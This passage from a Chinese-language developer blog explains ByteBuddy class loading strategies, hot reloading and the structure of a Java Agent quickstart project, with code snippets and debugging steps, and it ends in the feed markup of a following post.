<code>ClassLoadingStrategy.Default</code> 中，其中：</p><ul><li><strong>WRAPPER</strong>：这个策略会创建一个新的<code>ByteArrayClassLoader</code>，并使用传入的类加载器为父类。</li><li><strong>WRAPPER_PERSISTENT</strong>：该策略和<code>WRAPPER</code>大致一致，只是会将所有的类文件持久化到类加载器中</li><li><strong>CHILD_FIRST</strong>：这个策略是<code>WRAPPER</code>的改版，其中动态类型的优先级会比父类加载器中的同名类高，即在此种情况下不再是类加载器通常的父类优先，而是“子类优先”</li><li><strong>CHILD_FIRST_PERSISTENT</strong>：该策略和<code>CHILD_FIRST</code>大致一致，只是会将所有的类文件持久化到类加载器中</li><li><strong>INJECTION</strong>：这个策略最为特殊，他不会创建类加载器，而是通过反射的手段将类注入到指定的类加载器之中。这么做的好处是用这种方法注入的类对于类加载器中的其他类具有私有权限，而其他的策略不具备这种能力。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; dynamicClazz = <span class="keyword">new</span> <span class="title class_">ByteBuddy</span>()</span><br><span class="line">        <span class="comment">// 生成 Object的子类</span></span><br><span class="line">        .subclass(Object.class)</span><br><span class="line">        <span class="comment">// 生成类的名称为&quot;com.itheima.Type&quot;</span></span><br><span class="line">        .name(<span class="string">&quot;com.itheima.Type&quot;</span>)</span><br><span class="line">        .make()</span><br><span class="line">        .load(Demo.class.getClassLoader(),</span><br><span class="line">                <span class="comment">//使用WRAPPER 策略加载生成的动态类型</span></span><br><span class="line">                ClassLoadingStrategy.Default.WRAPPER)</span><br><span class="line">        .getLoaded();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="类的重载"><a class="markdownIt-Anchor" href="#类的重载"></a> 类的重载</h4><p>rebase和redefine通常没办法重新加载已经存在的类，但是由于jvm的热替换（HotSwap）机制的存在，使得<code>ByteBuddy</code>可以在加载后也能够重新定义类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">  String <span class="title function_">m</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;foo&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bar</span> &#123;</span><br><span class="line">  String <span class="title function_">m</span><span class="params">()</span> &#123; <span class="keyword">return</span> <span class="string">&quot;bar&quot;</span>; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过ByteBuddy的<code>ClassRelodingsTrategy</code>即可完成热替换。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ByteBuddyAgent.install();</span><br><span class="line"><span class="type">Foo</span> <span class="variable">foo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Foo</span>();</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ByteBuddy</span>()</span><br><span class="line">  .redefine(Bar.class)</span><br><span class="line">  .name(Foo.class.getName())</span><br><span class="line">  .make()</span><br><span class="line">  .load(Foo.class.getClassLoader(), ClassReloadingStrategy.fromInstalledAgent());</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要注意的是热替换机制必须依赖Java Agent才能使用</p><h4 id="未加载类"><a class="markdownIt-Anchor" href="#未加载类"></a> 未加载类</h4><p>ByteBuddy除了可以处理已经加载完的类，他也具备处理尚未被加载的类的能力。</p><p>ByteBuddy对java的反射api做了抽象，例如<code>Class</code>实例就被表示成了<code>TypeDescription</code>实例。事实上，ByteBuddy只知道如何通过实现<code>TypeDescription</code>接口的适配器来处理提供的 <code>Class</code>。这种抽象的一大优势是类信息不需要由类加载器提供，可以由任何其他来源提供。</p><p>ByteBuddy中可以通过<code>TypePool</code>获取类的<code>TypeDescription</code>，ByteBuddy提供了<code>TypePool</code>的默认实现<code>TypePool.Default</code>。这个类可以帮助我们把java字节码转换成<code>TypeDescription</code>。</p><p>Java的类加载器只会在类第一次使用的时候加载一次，因此我们可以在java中以如下方式安全的创建一个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> foo;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Bar</span> &#123; &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是通过如下的方法，我们可以在<code>Bar</code>这个类没有被加载前就提前生成我们自己的<code>Bar</code>，因此后续jvm就只会使用到我们的<code>Bar</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TypePool</span> <span class="variable">typePool</span> <span class="operator">=</span> TypePool.Default.ofSystemLoader();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">bar</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteBuddy</span>()</span><br><span class="line">      .redefine(typePool.describe(<span class="string">&quot;foo.Bar&quot;</span>).resolve(),</span><br><span class="line">                ClassFileLocator.ForClassLoader.ofSystemLoader())</span><br><span class="line">      .defineField(<span class="string">&quot;qux&quot;</span>, String.class)</span><br><span class="line">      .make()</span><br><span class="line">      .load(ClassLoader.getSystemClassLoader(), ClassLoadingStrategy.Default.INJECTION)</span><br><span class="line">      .getLoaded();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="java-agent项目记录"><a class="markdownIt-Anchor" href="#java-agent项目记录"></a> Java Agent项目记录</h2><p>项目地址：<a href="https://github.com/JAgentSphere/bytebuddy-agent-quickstart">https://github.com/JAgentSphere/bytebuddy-agent-quickstart</a></p><p>主要分为agent、core以及spy三个模块。</p><h3 id="java-agent入口"><a class="markdownIt-Anchor" href="#java-agent入口"></a> Java Agent入口</h3><p>Java Agent入口位于<code>agent/src/main/java/com/jas/quickstart/agent/AgentLauncher.java</code></p><p>启动时代理与运行时代理均从调用<code>launch</code>方法开始</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        launch(args, inst);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String args, Instrumentation inst)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        launch(args, inst);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>agent模块主要完成的任务包括</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//com.jas.quickstart.spy.Spy类加载</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addSpyJarToBootstrapClassLoader</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(SPY_CLASS_NAME);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">spyJarPath</span> <span class="operator">=</span> agentJarFolderPath + File.separator + SPY_JAR_FILE_NAME;</span><br><span class="line">            instrumentation.appendToBootstrapClassLoaderSearch(<span class="keyword">new</span> <span class="title class_">JarFile</span>(spyJarPath));</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用com.jas.quickstart.core.AgentMain（core模块）中的install方法;</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">launchCore</span><span class="params">()</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">coreJarPath</span> <span class="operator">=</span> agentJarFolderPath + File.separator + CORE_JAR_FILE_NAME;</span><br><span class="line">        coreClassLoader = <span class="keyword">new</span> <span class="title class_">CoreClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[] &#123;<span class="keyword">new</span> <span class="title class_">File</span>(coreJarPath).toURI().toURL()&#125;);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; mainClass = coreClassLoader.loadClass(CORE_CLASS_NAME);</span><br><span class="line">        mainInstance = mainClass.newInstance();</span><br><span class="line">        <span class="type">Method</span> <span class="variable">installMethod</span> <span class="operator">=</span> mainClass.getMethod(CORE_INSTALL_METHOD_NAME, Instrumentation.class);</span><br><span class="line">        installMethod.invoke(mainInstance, instrumentation);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="agent-core"><a class="markdownIt-Anchor" href="#agent-core"></a> Agent Core</h3><h4 id="理解aop"><a class="markdownIt-Anchor" href="#理解aop"></a> 理解AOP</h4><h4 id="agentbuilder"><a class="markdownIt-Anchor" href="#agentbuilder"></a> AgentBuilder</h4><h5 id="初始化"><a class="markdownIt-Anchor" href="#初始化"></a> 初始化</h5><p>AgentBuilder类负责与Instrumentation进行对接，通过注册不同的Listener来对处理不同类的加载过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">agentBuilder = <span class="keyword">new</span> <span class="title class_">AgentBuilder</span>.Default().disableClassFormatChanges()</span><br><span class="line">                .ignore(elementMatcher) <span class="comment">//放行规则匹配</span></span><br><span class="line">                .with(AgentBuilder.RedefinitionStrategy.RETRANSFORMATION) <span class="comment">//transform 策略</span></span><br><span class="line">                .with(<span class="keyword">new</span> <span class="title class_">CustomTransformListener</span>(dumpClass, dumpFolder));</span><br><span class="line">nativeAgentBuilder = <span class="keyword">new</span> <span class="title class_">AgentBuilder</span>.Default()</span><br><span class="line">                .ignore(none())</span><br><span class="line">                .enableNativeMethodPrefix(NATIVE_METHOD_PREFIX)</span><br><span class="line">                .with(AgentBuilder.TypeStrategy.Default.REBASE)</span><br><span class="line">                .with(<span class="keyword">new</span> <span class="title class_">ErrorTransformListener</span>());</span><br></pre></td></tr></table></figure><blockquote><p>不清楚这里是按栈顺序执行还是默认native方法先执行</p></blockquote><p>通过重写注册Listener的以下方法以控制类的加载过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ErrorTransformListener</span> <span class="keyword">implements</span> <span class="title class_">AgentBuilder</span>.Listener &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">log</span> <span class="operator">=</span> LoggerFactory.getLogger(ErrorTransformListener.class);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="title function_">ErrorTransformListener</span><span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//类初次加载</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onDiscovery</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="type">boolean</span> loaded)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//类transform</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onTransformation</span><span class="params">(TypeDescription typeDescription, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="type">boolean</span> loaded, DynamicType dynamicType)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//匹配到放行规则</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onIgnored</span><span class="params">(TypeDescription typeDescription, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="type">boolean</span> loaded)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//加载错误</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="type">boolean</span> loaded, Throwable throwable)</span> &#123;</span><br><span class="line">            log.error(<span class="string">&quot;transform class: &#123;&#125; failed&quot;</span>, typeName, throwable);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//无论类是否加载成功最后均执行</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onComplete</span><span class="params">(String typeName, ClassLoader classLoader, JavaModule <span class="keyword">module</span>, <span class="type">boolean</span> loaded)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="transform"><a class="markdownIt-Anchor" href="#transform"></a> transform</h5><p>类加载的堆栈执行顺序如下图</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46256686/1741090124942-789ad223-91dd-40d0-a3da-10af5c87398a.png" alt="" /></p><p>在intrumentation接口后对应执行transform方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] transform(<span class="meta">@MaybeNull</span> JavaModule <span class="keyword">module</span>, <span class="meta">@MaybeNull</span> ClassLoader classLoader, <span class="meta">@MaybeNull</span> String internalTypeName, <span class="meta">@MaybeNull</span> Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] binaryRepresentation) &#123;</span><br><span class="line">                <span class="keyword">if</span> (internalTypeName != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.lambdaInstrumentationStrategy.isInstrumented(classBeingRedefined)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> internalTypeName.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.resubmissionEnforcer.isEnforced(name, classLoader, <span class="keyword">module</span>, classBeingRedefined)) &#123;</span><br><span class="line">                            <span class="keyword">return</span> AgentBuilder.Default.NO_TRANSFORMATION;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var28) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="built_in">this</span>.listener.onDiscovery(name, classLoader, <span class="keyword">module</span>, classBeingRedefined != <span class="literal">null</span>);</span><br><span class="line">                        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                            <span class="built_in">this</span>.listener.onError(name, classLoader, <span class="keyword">module</span>, classBeingRedefined != <span class="literal">null</span>, var28);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Failed transformation of &quot;</span> + name, var28);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">byte</span>[] var11;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="built_in">this</span>.listener.onDiscovery(name, classLoader, <span class="keyword">module</span>, classBeingRedefined != <span class="literal">null</span>);</span><br><span class="line">                        <span class="type">ClassFileLocator</span> <span class="variable">classFileLocator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassFileLocator</span>.Compound(<span class="keyword">new</span> <span class="title class_">ClassFileLocator</span>[]&#123;<span class="built_in">this</span>.classFileBufferStrategy.resolve(name, binaryRepresentation, classLoader, <span class="keyword">module</span>, protectionDomain), <span class="built_in">this</span>.classFileLocator, <span class="built_in">this</span>.locationStrategy.classFileLocator(classLoader, <span class="keyword">module</span>)&#125;);</span><br><span class="line">                        <span class="type">TypePool</span> <span class="variable">typePool</span> <span class="operator">=</span> <span class="built_in">this</span>.classFileBufferStrategy.typePool(<span class="built_in">this</span>.poolStrategy, classFileLocator, classLoader, name);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">byte</span>[] var10 = <span class="built_in">this</span>.doTransform(<span class="keyword">module</span>, classLoader, name, classBeingRedefined, classBeingRedefined != <span class="literal">null</span>, protectionDomain, typePool, classFileLocator);</span><br><span class="line">                            <span class="keyword">return</span> var10;</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable var25) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (classBeingRedefined == <span class="literal">null</span> || !<span class="built_in">this</span>.descriptionStrategy.isLoadedFirst() || !<span class="built_in">this</span>.fallbackStrategy.isFallback(classBeingRedefined, var25)) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> var25;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        var11 = <span class="built_in">this</span>.doTransform(<span class="keyword">module</span>, classLoader, name, AgentBuilder.Default.NOT_PREVIOUSLY_DEFINED, <span class="literal">true</span>, protectionDomain, typePool, classFileLocator);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Throwable var26) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.listener.onError(name, classLoader, <span class="keyword">module</span>, classBeingRedefined != <span class="literal">null</span>, var26);</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Failed transformation of &quot;</span> + name, var26);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        <span class="built_in">this</span>.listener.onComplete(name, classLoader, <span class="keyword">module</span>, classBeingRedefined != <span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> var11;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> AgentBuilder.Default.NO_TRANSFORMATION;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>doTransform首先匹配类是否位于agentbuilder的放行规则，如果不在则进一步查找有无相应的transformer，如果没有匹配的transformer，则同样调用onIgnored方法；反之则分别调用匹配的transform进行字节码转换处理，最后调用onTransformation方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] doTransform(<span class="meta">@MaybeNull</span> JavaModule <span class="keyword">module</span>, <span class="meta">@MaybeNull</span> ClassLoader classLoader, String name, <span class="meta">@MaybeNull</span> Class&lt;?&gt; classBeingRedefined, <span class="type">boolean</span> loaded, ProtectionDomain protectionDomain, TypePool typePool, ClassFileLocator classFileLocator) &#123;</span><br><span class="line">                <span class="type">TypeDescription</span> <span class="variable">typeDescription</span> <span class="operator">=</span> <span class="built_in">this</span>.descriptionStrategy.apply(name, classBeingRedefined, typePool, <span class="built_in">this</span>.circularityLock, classLoader, <span class="keyword">module</span>);</span><br><span class="line">                List&lt;Transformer&gt; transformers = <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.ignoreMatcher.matches(typeDescription, classLoader, <span class="keyword">module</span>, classBeingRedefined, protectionDomain)) &#123;</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">var11</span> <span class="operator">=</span> <span class="built_in">this</span>.transformations.iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var11.hasNext()) &#123;</span><br><span class="line">                        <span class="type">Transformation</span> <span class="variable">transformation</span> <span class="operator">=</span> (Transformation)var11.next();</span><br><span class="line">                        <span class="keyword">if</span> (transformation.getMatcher().matches(typeDescription, classLoader, <span class="keyword">module</span>, classBeingRedefined, protectionDomain)) &#123;</span><br><span class="line">                            transformers.addAll(transformation.getTransformers());</span><br><span class="line">                            <span class="keyword">if</span> (transformation.isTerminal()) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (transformers.isEmpty()) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.listener.onIgnored(typeDescription, classLoader, <span class="keyword">module</span>, loaded);</span><br><span class="line">                    <span class="keyword">return</span> AgentBuilder.Default.Transformation.NONE;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    DynamicType.Builder&lt;?&gt; builder = <span class="built_in">this</span>.typeStrategy.builder(typeDescription, <span class="built_in">this</span>.byteBuddy, classFileLocator, <span class="built_in">this</span>.nativeMethodStrategy.resolve(), classLoader, <span class="keyword">module</span>, protectionDomain);</span><br><span class="line">                    InitializationStrategy.<span class="type">Dispatcher</span> <span class="variable">dispatcher</span> <span class="operator">=</span> <span class="built_in">this</span>.initializationStrategy.dispatcher();</span><br><span class="line"></span><br><span class="line">                    Transformer transformer;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">Iterator</span> <span class="variable">var13</span> <span class="operator">=</span> transformers.iterator(); var13.hasNext(); builder = transformer.transform(builder, typeDescription, classLoader, <span class="keyword">module</span>, protectionDomain)) &#123;</span><br><span class="line">                        transformer = (Transformer)var13.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    DynamicType.Unloaded&lt;?&gt; dynamicType = dispatcher.apply(builder).make(net.bytebuddy.dynamic.TypeResolutionStrategy.Disabled.INSTANCE, typePool);</span><br><span class="line">                    dispatcher.register(dynamicType, classLoader, protectionDomain, <span class="built_in">this</span>.injectionStrategy);</span><br><span class="line">                    <span class="built_in">this</span>.listener.onTransformation(typeDescription, classLoader, <span class="keyword">module</span>, loaded, dynamicType);</span><br><span class="line">                    <span class="keyword">return</span> dynamicType.getBytes();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><h2 id="java-agent调试"><a class="markdownIt-Anchor" href="#java-agent调试"></a> Java Agent调试</h2><h3 id="agent构建"><a class="markdownIt-Anchor" href="#agent构建"></a> Agent构建</h3><p>gradle构建第3小节生成的项目后，在release目录下会生成三个jar包</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46256686/1739866833975-22808596-0fa8-4f60-b157-6fd9d728266f.png" alt="" /></p><h3 id="agent注入"><a class="markdownIt-Anchor" href="#agent注入"></a> Agent注入</h3><p>这里我随便找了一个项目来辅助调试</p><p>将生成的三个jar包以及conf目录拷贝到应用目录下</p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46256686/1739866775744-59237aef-e190-4619-afe0-1c137cd06f6c.png" alt="" /></p><p>右键每个jar包<code>add as library</code>即可查看源码并添加断点，同时运行构建configuration添加VM Option</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-javaagent:xxxxx\Hotel-java-demo\agent.jar</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2025/png/46256686/1739867093039-0d51d836-e75f-4af4-8e51-f9d87c646524.png" alt="" /></p><h2 id="参考资料"><a class="markdownIt-Anchor" href="#参考资料"></a> 参考资料</h2><ol><li><a href="https://juejin.cn/post/7110113494447423518">https://juejin.cn/post/7110113494447423518</a></li><li><a href="https://juejin.cn/post/7233409321342107707">Java字节码 - ByteBuddy原理与使用（上）</a></li><li><a href="https://juejin.cn/post/7233417315526000695#heading-0">Java字节码 - ByteBuddy原理与使用（下）</a></li><li><a href="https://blog.csdn.net/undergrowth/article/details/86493336">https://blog.csdn.net/undergrowth/article/details/86493336</a></li><li><a href="https://www.cnblogs.com/hollischuang/p/14260801.html">双亲委派</a></li><li><a href="https://itcloud.top/article/details/241">Java Agent Debug</a></li><li><a href="https://juejin.cn/post/7407407711879331890">Java Agent 深入解析：原理、应用及实践</a></li><li><a href="https://notes.diguage.com/byte-buddy-tutorial/preface.html">Byte Buddy 教程 Alpha</a></li><li><a href="https://liaoxuefeng.com/books/java/spring/aop/index.html">使用AOP - Java教程 - 廖雪峰的官方网站</a></li><li><a href="http://www.enmalvi.com/2022/05/16/java-javaagent/#!">http://www.enmalvi.com/2022/05/16/java-javaagent/#!</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java Agent </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>『科研』流程挖掘领域研究现状总结</title>
      <link href="/posts/3e31.html"/>
      <url>/posts/3e31.html</url>
      
